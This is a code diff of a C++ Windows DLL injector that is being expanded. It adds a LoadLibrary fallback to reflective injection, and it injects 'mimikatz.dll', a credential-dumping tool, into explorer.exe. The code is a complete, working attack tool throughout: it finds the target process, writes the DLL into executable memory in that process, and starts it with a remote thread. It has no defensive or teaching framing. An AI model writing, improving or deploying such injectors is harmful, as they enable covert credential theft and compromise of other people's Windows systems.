@@ -4,18 +4,20 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
-#pragma comment(lib, "shlwapi.lib")
+#include <string>
 
-DWORD GetProcId(const char* processName) {
-    PROCESSENTRY32 pe32{};
-    pe32.dwSize = sizeof(PROCESSENTRY32);
+#pragma comment(lib, "Shlwapi.lib")
+
+// ------------------- Process Discovery -------------------
+DWORD GetProcessIdByName(const char* processName) {
+    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) return 0;
 
     DWORD pid = 0;
     if (Process32First(snapshot, &pe32)) {
         do {
-            if (!_stricmp(pe32.szExeFile, processName)) {
+            if (_stricmp(pe32.szExeFile, processName) == 0) {
                 pid = pe32.th32ProcessID;
                 break;
             }
@@ -25,60 +27,109 @@ DWORD GetProcId(const char* processName) {
     return pid;
 }
 
-bool ReflectiveInject(DWORD pid, const std::vector<char>& dllBuffer) {
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return false;
+// ------------------- DLL Buffer Loader -------------------
+bool LoadFileToBuffer(const std::string& path, std::vector<char>& buffer) {
+    std::ifstream file(path, std::ios::binary);
+    if (!file) return false;
+    buffer = std::vector<char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+    return true;
+}
 
-    void* remoteMem = VirtualAllocEx(hProcess, nullptr, dllBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+// ------------------- Injection Logic -------------------
+bool InjectDLLBuffer(DWORD pid, const std::vector<char>& dllBuffer) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) return false;
+
+    LPVOID remoteMem = VirtualAllocEx(hProc, nullptr, dllBuffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMem) {
-        CloseHandle(hProcess);
+        CloseHandle(hProc);
         return false;
     }
 
-    SIZE_T written;
-    if (!WriteProcessMemory(hProcess, remoteMem, dllBuffer.data(), dllBuffer.size(), &written)) {
-        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+    SIZE_T bytesWritten;
+    if (!WriteProcessMemory(hProc, remoteMem, dllBuffer.data(), dllBuffer.size(), &bytesWritten)) {
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
         return false;
     }
 
-    // Assuming the DLL has a reflective entrypoint at its start
-    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
+    // Reflective DLL should have shellcode-style stub at start
+    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
     if (!hThread) {
-        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
+        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
         return false;
     }
 
     CloseHandle(hThread);
-    CloseHandle(hProcess);
+    CloseHandle(hProc);
     return true;
 }
 
+// ------------------- Fallback LoadLibrary Method -------------------
+bool InjectViaLoadLibrary(DWORD pid, const std::string& fullPath) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) return false;
+
+    LPVOID allocMem = VirtualAllocEx(hProc, nullptr, fullPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!allocMem) {
+        CloseHandle(hProc);
+        return false;
+    }
+
+    WriteProcessMemory(hProc, allocMem, fullPath.c_str(), fullPath.size() + 1, nullptr);
+    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"),
+        allocMem, 0, nullptr);
+
+    if (!hThread) {
+        VirtualFreeEx(hProc, allocMem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return false;
+    }
+
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return true;
+}
+
+// ------------------- Main Entry -------------------
 int main() {
-    std::string pname = "explorer.exe"; // example target
-    std::string dllFile = "mimikatz.dll";
+    std::string processName = "explorer.exe";
+    std::string dllPath = "mimikatz.dll";
 
-    if (!PathFileExistsA(dllFile.c_str())) {
-        std::cerr << "DLL not found\n";
+    std::cout << "[+] Target: " << processName << "\n";
+    std::cout << "[+] DLL Path: " << dllPath << "\n";
+
+    if (!PathFileExistsA(dllPath.c_str())) {
+        std::cerr << "[-] DLL file not found.\n";
         return -1;
     }
 
-    DWORD pid = GetProcId(pname.c_str());
+    DWORD pid = GetProcessIdByName(processName.c_str());
     if (!pid) {
-        std::cerr << "Target process not found.\n";
-        return -1;
+        std::cerr << "[-] Target process not found.\n";
+        return -2;
     }
 
-    std::ifstream dll(dllFile, std::ios::binary);
-    std::vector<char> buffer((std::istreambuf_iterator<char>(dll)), std::istreambuf_iterator<char>());
-    dll.close();
-
-    if (ReflectiveInject(pid, buffer)) {
-        std::cout << "Reflective Injection Successful.\n";
+    std::vector<char> dllBuffer;
+    if (!LoadFileToBuffer(dllPath, dllBuffer)) {
+        std::cerr << "[-] Failed to load DLL into memory.\n";
+        return -3;
     }
-    else {
-        std::cout << "Injection Failed.\n";
+
+    std::cout << "[*] Attempting Reflective Injection...\n";
+    if (InjectDLLBuffer(pid, dllBuffer)) {
+        std::cout << "[+] Reflective Injection succeeded!\n";
+    } else {
+        std::cout << "[!] Reflective Injection failed. Trying LoadLibrary fallback...\n";
+        if (InjectViaLoadLibrary(pid, dllPath)) {
+            std::cout << "[+] Fallback LoadLibrary injection succeeded.\n";
+        } else {
+            std::cerr << "[-] Both injection methods failed.\n";
+            return -4;
+        }
     }
 
     return 0;
